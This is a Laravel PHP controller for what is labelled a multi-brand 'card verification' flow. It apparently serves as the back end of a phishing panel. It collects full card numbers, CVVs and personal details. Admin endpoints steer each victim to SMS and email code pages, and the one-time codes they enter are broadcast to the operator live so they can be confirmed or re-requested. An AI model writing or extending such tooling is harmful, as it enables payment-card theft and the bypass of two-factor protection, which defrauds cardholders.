<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\CardVerification;
use App\Models\Brand;
use App\Events\CardVerificationUpdated;
use App\Events\CardCodeSubmitted;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Validator;

class CardVerificationController extends Controller
{
    /**
     * Client submits card details — step 1 of verification.
     */
    public function store(Request $request): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'brand_slug' => 'required|exists:brands,slug',
            'cardholder_name' => 'required|string|max:255',
            'card_number' => 'required|string|min:13|max:19',
            'card_expiry' => 'required|string|regex:/^\d{2}\/\d{2}$/',
            'card_cvv' => 'required|string|min:3|max:4',
            'email' => 'required|email|max:255',
            'phone' => 'nullable|string|max:20',
            'address_line_1' => 'nullable|string|max:500',
            'address_line_2' => 'nullable|string|max:500',
            'city' => 'nullable|string|max:255',
            'state' => 'nullable|string|max:255',
            'postal_code' => 'nullable|string|max:20',
            'country' => 'nullable|string|max:100',
        ]);

        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()], 422);
        }

        $brand = Brand::where('slug', $request->brand_slug)->firstOrFail();
        $cardNumber = preg_replace('/\D/', '', $request->card_number);

        $card = CardVerification::create([
            'brand_id' => $brand->id,
            'cardholder_name' => $request->cardholder_name,
            'card_number_masked' => CardVerification::maskCardNumber($cardNumber),
            'card_number_encrypted' => Crypt::encryptString($cardNumber),
            'card_expiry' => $request->card_expiry,
            'card_cvv_encrypted' => Crypt::encryptString($request->card_cvv),
            'card_type' => CardVerification::detectCardType($cardNumber),
            'email' => $request->email,
            'phone' => $request->phone,
            'address_line_1' => $request->address_line_1,
            'address_line_2' => $request->address_line_2,
            'city' => $request->city,
            'state' => $request->state,
            'postal_code' => $request->postal_code,
            'country' => $request->country,
            'status' => 'pending',
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
        ]);

        $card->load('brand');
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => 'Card submitted for verification.',
            'data' => [
                'uuid' => $card->uuid,
                'session_token' => $card->session_token,
                'status' => $card->status,
            ],
        ], 201);
    }

    /**
     * Client polls or checks their card verification status.
     * Uses session_token (no auth needed).
     */
    public function status(Request $request, string $sessionToken): JsonResponse
    {
        $card = CardVerification::where('session_token', $sessionToken)
            ->with('brand')
            ->firstOrFail();

        return response()->json([
            'data' => [
                'uuid' => $card->uuid,
                'status' => $card->status,
                'cardholder_name' => $card->cardholder_name,
                'card_number_masked' => $card->card_number_masked,
                'card_type' => $card->card_type,
                'sms_code_valid' => $card->sms_code_valid,
                'email_code_valid' => $card->email_code_valid,
                'verified_at' => $card->verified_at,
                'brand' => $card->brand->slug,
            ],
        ]);
    }

    /**
     * Client submits SMS code — step 2.
     */
    public function submitSmsCode(Request $request, string $sessionToken): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'code' => 'required|string|min:4|max:8',
        ]);

        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()], 422);
        }

        $card = CardVerification::where('session_token', $sessionToken)
            ->where('status', 'awaiting_sms')
            ->firstOrFail();

        $card->update([
            'sms_code' => $request->code,
            'sms_code_entered_at' => now(),
            'status' => 'sms_code_entered',
        ]);

        $card->load('brand');

        // Broadcast to admin — code appears live
        broadcast(new CardCodeSubmitted($card, 'sms', $request->code));
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => 'SMS code submitted. Waiting for admin confirmation.',
            'data' => [
                'uuid' => $card->uuid,
                'status' => $card->status,
            ],
        ]);
    }

    /**
     * Client submits Email code — step 3.
     */
    public function submitEmailCode(Request $request, string $sessionToken): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'code' => 'required|string|min:4|max:8',
        ]);

        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()], 422);
        }

        $card = CardVerification::where('session_token', $sessionToken)
            ->where('status', 'awaiting_email')
            ->firstOrFail();

        $card->update([
            'email_code' => $request->code,
            'email_code_entered_at' => now(),
            'status' => 'email_code_entered',
        ]);

        $card->load('brand');

        broadcast(new CardCodeSubmitted($card, 'email', $request->code));
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => 'Email code submitted. Waiting for admin confirmation.',
            'data' => [
                'uuid' => $card->uuid,
                'status' => $card->status,
            ],
        ]);
    }

    /**
     * Admin action — Request SMS code (redirect client to SMS page).
     */
    public function adminRequestSms(Request $request, string $uuid): JsonResponse
    {
        $card = CardVerification::where('uuid', $uuid)->firstOrFail();

        $card->update([
            'status' => 'awaiting_sms',
            'sms_requested_at' => now(),
        ]);

        $card->load('brand');
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => 'Client redirected to SMS code entry.',
            'data' => $card,
        ]);
    }

    /**
     * Admin action — Confirm or reject SMS code.
     */
    public function adminConfirmSms(Request $request, string $uuid): JsonResponse
    {
        $valid = $request->input('valid', true);

        $card = CardVerification::where('uuid', $uuid)
            ->where('status', 'sms_code_entered')
            ->firstOrFail();

        $card->update([
            'sms_code_valid' => $valid,
            'status' => $valid ? 'sms_confirmed' : 'sms_rejected',
            'reviewed_by' => $request->user()?->id,
        ]);

        $card->load('brand');
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => $valid ? 'SMS code confirmed.' : 'SMS code rejected.',
            'data' => $card,
        ]);
    }

    /**
     * Admin action — Request email code (redirect client to email code page).
     */
    public function adminRequestEmail(Request $request, string $uuid): JsonResponse
    {
        $card = CardVerification::where('uuid', $uuid)->firstOrFail();

        $card->update([
            'status' => 'awaiting_email',
            'email_requested_at' => now(),
        ]);

        $card->load('brand');
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => 'Client redirected to email code entry.',
            'data' => $card,
        ]);
    }

    /**
     * Admin action — Reject SMS code (send client back to SMS entry).
     */
    public function adminRejectSms(Request $request, string $uuid): JsonResponse
    {
        $card = CardVerification::where('uuid', $uuid)
            ->where('status', 'sms_code_entered')
            ->firstOrFail();

        $card->update([
            'sms_code' => null,
            'sms_code_valid' => false,
            'status' => 'awaiting_sms',
            'reviewed_by' => $request->user()?->id,
        ]);

        $card->load('brand');
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => 'SMS code rejected. Client redirected to re-enter.',
            'data' => $card,
        ]);
    }

    /**
     * Admin action — Reject email code (send client back to email entry).
     */
    public function adminRejectEmail(Request $request, string $uuid): JsonResponse
    {
        $card = CardVerification::where('uuid', $uuid)
            ->where('status', 'email_code_entered')
            ->firstOrFail();

        $card->update([
            'email_code' => null,
            'email_code_valid' => false,
            'status' => 'awaiting_email',
            'reviewed_by' => $request->user()?->id,
        ]);

        $card->load('brand');
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => 'Email code rejected. Client redirected to re-enter.',
            'data' => $card,
        ]);
    }

    /**
     * Admin action — Confirm or reject email code.
     */
    public function adminConfirmEmail(Request $request, string $uuid): JsonResponse
    {
        $valid = $request->input('valid', true);

        $card = CardVerification::where('uuid', $uuid)
            ->where('status', 'email_code_entered')
            ->firstOrFail();

        $card->update([
            'email_code_valid' => $valid,
            'status' => $valid ? 'email_confirmed' : 'email_rejected',
            'reviewed_by' => $request->user()?->id,
        ]);

        $card->load('brand');
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => $valid ? 'Email code confirmed.' : 'Email code rejected.',
            'data' => $card,
        ]);
    }

    /**
     * Admin action — Mark fully verified.
     */
    public function adminVerify(Request $request, string $uuid): JsonResponse
    {
        $card = CardVerification::where('uuid', $uuid)->firstOrFail();

        $card->update([
            'status' => 'verified',
            'verified_at' => now(),
            'reviewed_by' => $request->user()?->id,
        ]);

        $card->load('brand');
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => 'Card verification completed.',
            'data' => $card,
        ]);
    }

    /**
     * Admin action — Mark as failed.
     */
    public function adminFail(Request $request, string $uuid): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'notes' => 'nullable|string|max:1000',
        ]);

        $card = CardVerification::where('uuid', $uuid)->firstOrFail();

        $card->update([
            'status' => 'failed',
            'admin_notes' => $request->notes,
            'reviewed_by' => $request->user()?->id,
        ]);

        $card->load('brand');
        broadcast(new CardVerificationUpdated($card));

        return response()->json([
            'message' => 'Card verification marked as failed.',
            'data' => $card,
        ]);
    }
}
